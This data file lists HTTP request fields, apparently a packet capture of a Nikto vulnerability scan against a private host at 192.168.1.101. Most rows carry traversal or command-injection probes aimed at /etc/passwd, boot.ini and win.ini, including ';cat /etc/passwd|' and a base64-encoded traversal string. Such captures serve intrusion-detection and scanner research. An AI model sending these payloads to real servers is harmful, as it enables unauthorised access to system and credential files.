http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									9061						1	http://192.168.1.101/web/mlog.phtml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003058)				/web/mlog.phtml
																	Keep-Alive										192.168.1.101									9069						1	http://192.168.1.101/web/mylog.html?screen=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003059)				/web/mylog.html?screen=/etc/passwd
																	Keep-Alive										192.168.1.101									9076						1	http://192.168.1.101/web/mylog.phtml?screen=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003060)				/web/mylog.phtml?screen=/etc/passwd
																	Keep-Alive										192.168.1.101									9082						1	http://192.168.1.101/web/php/mlog.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003061)				/web/php/mlog.html
																	Keep-Alive										192.168.1.101									9090						1	http://192.168.1.101/web/php/mlog.phtml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003062)				/web/php/mlog.phtml
																	Keep-Alive										192.168.1.101									9096						1	http://192.168.1.101/web/php/mylog.html?screen=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003063)				/web/php/mylog.html?screen=/etc/passwd
																	Keep-Alive										192.168.1.101									9103						1	http://192.168.1.101/web/php/mylog.phtml?screen=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003064)				/web/php/mylog.phtml?screen=/etc/passwd
																	Keep-Alive										192.168.1.101									9110						1	http://192.168.1.101/web/fi?/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003065)				/web/fi?/etc/passwd
																	Keep-Alive										192.168.1.101									9117						1	http://192.168.1.101/web/directory.php?dir=%3Bcat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003070)				/web/directory.php?dir=%3Bcat%20/etc/passwd
																	Keep-Alive										192.168.1.101									9127						1	http://192.168.1.101/web/content/base/build/explorer/none.php?..:..:..:..:..:..:..:etc:passwd:		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003071)				/web/content/base/build/explorer/none.php?..:..:..:..:..:..:..:etc:passwd:
																	Keep-Alive										192.168.1.101									9134						1	http://192.168.1.101/web/content/base/build/explorer/none.php?/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003072)				/web/content/base/build/explorer/none.php?/etc/passwd
																	Keep-Alive										192.168.1.101									9142						1	http://192.168.1.101/web/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003075)				/web/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									9150						1	http://192.168.1.101/web/postnuke/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003075)				/web/postnuke/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									9158						1	http://192.168.1.101/web/postnuke/html/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003075)				/web/postnuke/html/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									9166						1	http://192.168.1.101/web/modules/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003075)				/web/modules/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									9172						1	http://192.168.1.101/web/phpBB/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003075)				/web/phpBB/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									9180						1	http://192.168.1.101/web/forum/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003075)				/web/forum/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									9186						1	http://192.168.1.101/web/GW5/GWWEB.EXE?HELP=bad-request		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003077)				/web/GW5/GWWEB.EXE?HELP=bad-request
																	Keep-Alive										192.168.1.101									9193						1	http://192.168.1.101/web/GWWEB.EXE?HELP=bad-request		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003078)				/web/GWWEB.EXE?HELP=bad-request
																	Keep-Alive										192.168.1.101									9199						1	http://192.168.1.101/web/scripts/tools/getdrvrs.exe		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003093)				/web/scripts/tools/getdrvrs.exe
																	Keep-Alive										192.168.1.101									9207						1	http://192.168.1.101/web/shop/normal_html.cgi?file=../../../../../../etc/issue%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003098)				/web/shop/normal_html.cgi?file=../../../../../../etc/issue%00
																	Keep-Alive										192.168.1.101									9213						1	http://192.168.1.101/web/shop/normal_html.cgi?file=;cat%20/etc/passwd|		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003099)				/web/shop/normal_html.cgi?file=;cat%20/etc/passwd|
																	Keep-Alive										192.168.1.101									9219						1	http://192.168.1.101/web/shop/normal_html.cgi?file=|cat%20/etc/passwd|		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003100)				/web/shop/normal_html.cgi?file=|cat%20/etc/passwd|
																	Keep-Alive										192.168.1.101									9226						1	http://192.168.1.101/web/shop/member_html.cgi?file=;cat%20/etc/passwd|		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003101)				/web/shop/member_html.cgi?file=;cat%20/etc/passwd|
																	Keep-Alive										192.168.1.101									9232						1	http://192.168.1.101/web/shop/member_html.cgi?file=|cat%20/etc/passwd|		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003102)				/web/shop/member_html.cgi?file=|cat%20/etc/passwd|
																	Keep-Alive										192.168.1.101									9240						1	http://192.168.1.101/web/boilerplate.asp?NFuse_Template=.../.../.../.../.../.../.../.../.../boot.ini&NFuse_CurrentFolder=/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003104)				/web/boilerplate.asp?NFuse_Template=.../.../.../.../.../.../.../.../.../boot.ini&NFuse_CurrentFolder=/
																	Keep-Alive										192.168.1.101									9247						1	http://192.168.1.101/web/?pattern=/etc/*&sort=name		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003120)				/web/?pattern=/etc/*&sort=name
																	Keep-Alive										192.168.1.101									9254						1	http://192.168.1.101/web/images/?pattern=/etc/*&sort=name		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003121)				/web/images/?pattern=/etc/*&sort=name
																	Keep-Alive										192.168.1.101									9259						1	http://192.168.1.101/web/3rdparty/phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003127)				/web/3rdparty/phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									9266						1	http://192.168.1.101/web/phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003127)				/web/phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									9274						1	http://192.168.1.101/web/3rdparty/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003127)				/web/3rdparty/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									9282						1	http://192.168.1.101/web/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003127)				/web/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									9289						1	http://192.168.1.101/web/pma/export.php?what=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003127)				/web/pma/export.php?what=../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									9295						1	http://192.168.1.101/web/dcforum/dcforum.cgi?az=list&forum=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003131)				/web/dcforum/dcforum.cgi?az=list&forum=../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.101									9303						1	http://192.168.1.101/web/internal.sws?../../../../../../../../winnt/win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003139)				/web/internal.sws?../../../../../../../../winnt/win.ini
																	Keep-Alive										192.168.1.101									9310						1	http://192.168.1.101/web/internal.sws?../../../../../../../../winnt/win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003140)				/web/internal.sws?../../../../../../../../winnt/win.ini
																	Keep-Alive										192.168.1.101									9317						1	http://192.168.1.101/web/internal.sws?.../.../.../.../.../.../.../.../winnt/win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003141)				/web/internal.sws?.../.../.../.../.../.../.../.../winnt/win.ini
																	Keep-Alive										192.168.1.101									9324						1	http://192.168.1.101/web/internal.sws?.../.../.../.../.../.../.../.../winnt/win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003142)				/web/internal.sws?.../.../.../.../.../.../.../.../winnt/win.ini
																	Keep-Alive										192.168.1.101									9332						1	http://192.168.1.101/web/viewimg.php?path=../../../../../../../../../../etc/passwd&form=1&var=1		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003154)				/web/viewimg.php?path=../../../../../../../../../../etc/passwd&form=1&var=1
																	Keep-Alive										192.168.1.101									9338						1	http://192.168.1.101/web/.../.../.../		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003179)				/web/.../.../.../
																	Keep-Alive										192.168.1.101									9345						1	http://192.168.1.101/web/Sites/Knowledge/Membership/Inspired/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003202)				/web/Sites/Knowledge/Membership/Inspired/ViewCode.asp
																	Keep-Alive										192.168.1.101									9354						1	http://192.168.1.101/web/Sites/Knowledge/Membership/Inspiredtutorial/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003203)				/web/Sites/Knowledge/Membership/Inspiredtutorial/ViewCode.asp
																	Keep-Alive										192.168.1.101									9362						1	http://192.168.1.101/web/Sites/Samples/Knowledge/Membership/Inspired/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003204)				/web/Sites/Samples/Knowledge/Membership/Inspired/ViewCode.asp
																	Keep-Alive										192.168.1.101									9368						1	http://192.168.1.101/web/Sites/Samples/Knowledge/Membership/Inspiredtutorial/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003205)				/web/Sites/Samples/Knowledge/Membership/Inspiredtutorial/ViewCode.asp
																	Keep-Alive										192.168.1.101									9376						1	http://192.168.1.101/web/Sites/Samples/Knowledge/Push/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003206)				/web/Sites/Samples/Knowledge/Push/ViewCode.asp
																	Keep-Alive										192.168.1.101									9383						1	http://192.168.1.101/web/Sites/Samples/Knowledge/Search/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003207)				/web/Sites/Samples/Knowledge/Search/ViewCode.asp
																	Keep-Alive										192.168.1.101									9389						1	http://192.168.1.101/web/SiteServer/Publishing/ViewCode.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003208)				/web/SiteServer/Publishing/ViewCode.asp
																	Keep-Alive										192.168.1.101									9396						1	http://192.168.1.101/web/siteserver/publishing/viewcode.asp?source=/default.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003209)				/web/siteserver/publishing/viewcode.asp?source=/default.asp
																	Keep-Alive										192.168.1.101									9404						1	http://192.168.1.101/web/shoutbox.php?conf=../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003210)				/web/shoutbox.php?conf=../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.101									9410						1	http://192.168.1.101/web/.%252e/.%252e/.%252e/winnt/boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003212)				/web/.%252e/.%252e/.%252e/winnt/boot.ini
																	Keep-Alive										192.168.1.101									9416						1	http://192.168.1.101/web/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003265)				/web/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									9424						1	http://192.168.1.101/web/postnuke/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003265)				/web/postnuke/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									9432						1	http://192.168.1.101/web/postnuke/html/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003265)				/web/postnuke/html/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									9438						1	http://192.168.1.101/web/modules/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003265)				/web/modules/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									9445						1	http://192.168.1.101/web/phpBB/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003265)				/web/phpBB/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									9452						1	http://192.168.1.101/web/forum/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003265)				/web/forum/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK
																	Keep-Alive										192.168.1.101									9459						1	http://192.168.1.101/web/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/jabber/comment2.jse+/system/autoexec.ncf		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003266)				/web/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/jabber/comment2.jse+/system/autoexec.ncf
																	Keep-Alive										192.168.1.101									9468						1	http://192.168.1.101/web/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003267)				/web/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf
